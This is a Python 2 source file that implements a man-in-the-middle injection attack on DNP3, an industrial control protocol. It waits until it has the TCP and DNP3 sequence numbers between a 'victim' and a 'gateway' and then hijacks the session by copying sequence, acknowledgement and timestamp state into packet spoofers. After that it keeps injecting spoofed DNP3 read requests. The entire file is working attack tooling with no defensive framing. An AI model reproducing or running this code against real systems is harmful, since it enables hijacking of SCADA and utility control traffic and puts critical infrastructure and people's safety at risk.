__author__ = 'Nicholas Rodofile'

from DNP3_Injection import *

class DNP3_MITM_Injection(DNP3_Injection):
    def __init__(self, victim=None, gateway=None, verbose=1, pkt_count=1, interface_selected=None):
        DNP3_Injection.__init__(self, victim=victim, gateway=gateway, verbose=verbose, pkt_count=pkt_count,
                                interface_selected=interface_selected)

    def automation(self, spoofer):
        requests = [
            [appFuncCode["READ"], "read_request_class0123"],
            [appFuncCode["READ"], "read_requestClass1"],
            [appFuncCode["READ"], "read_requestClass2"],
            [appFuncCode["READ"], "read_requestClass3"]
        ]
        print "automation"
        while self.attacking:
            request = requests[random.randrange(0, len(requests)-1)]
            spoofer.inject_automation(request)
            sleep(random.randrange(1, 3))

    def hijacker(self, pkt):
        if pkt.haslayer(DNP3ApplicationResponse):
            self.hijacked = True

    def hijacker_stop_filter(self, pkt):
        if self.hijacked:
            print "Hijacker Active"
        return self.hijacked

    def hijack_connection(self):
        sniff(count=0, store=0, prn=self.hijacker, stop_filter=self.hijacker_stop_filter, timeout=1)
        self.conditional_forwarding = True

    def injector(self):
        spoofer = self.gateway.spoofer
        while self.gateway.sequence <= 0 or self.victim.sequence <= 0:
            # wait for sequence numbers
            pass
        while self.gateway.DNP3_address is None or self.victim.DNP3_address is None:
            # wait for sequence numbers
            pass
        print "TCP and DNP3 Connection is now Compromised"
        self.hijack_connection()

        self.victim.spoofer.dnp3_spoof_sequence = self.gateway.DNP3_sequence
        self.gateway.spoofer.dnp3_spoof_sequence = self.victim.DNP3_sequence
        self.victim.spoofer.dnp3_app_sequence = self.gateway.DNP3_app_sequence
        self.gateway.spoofer.dnp3_app_sequence = self.victim.DNP3_app_sequence
        self.gateway.spoofer.timestamp = self.victim.timestamp
        self.victim.spoofer.timestamp = self.victim.timestamp
        self.gateway.spoofer.timestamp_ecr = self.victim.timestamp_echo_response
        self.victim.spoofer.timestamp_ecr = self.gateway.timestamp_echo_response
        self.gateway.spoofer.start_time = time.time()
        self.victim.spoofer.start_time = time.time()
        self.gateway.spoofer.sequence = self.victim.acknowledgement
        self.gateway.spoofer.acknowledgement = self.victim.sequence
        self.gateway.spoofer.window_size = self.victim.window_size
        self.victim.spoofer.window_size = self.gateway.window_size
        print "Connection is now hijacked, listening for Injection"
        print "Victim DNP3 Seq", self.victim.spoofer.dnp3_spoof_sequence
        print "Gateway DNP3 Seq", self.gateway.spoofer.dnp3_spoof_sequence
        self.automation(spoofer)

def DNP3_MITM_Injection_conf(interface='eth0', verbose=1, pkt_count=300):
    gateway, victim = config_nodes(interface=interface, init_nodes_func=init_dnp3_nodes, port="20000")
    return DNP3_MITM_Injection(interface_selected=interface, gateway=gateway, victim=victim, verbose=verbose, pkt_count=pkt_count)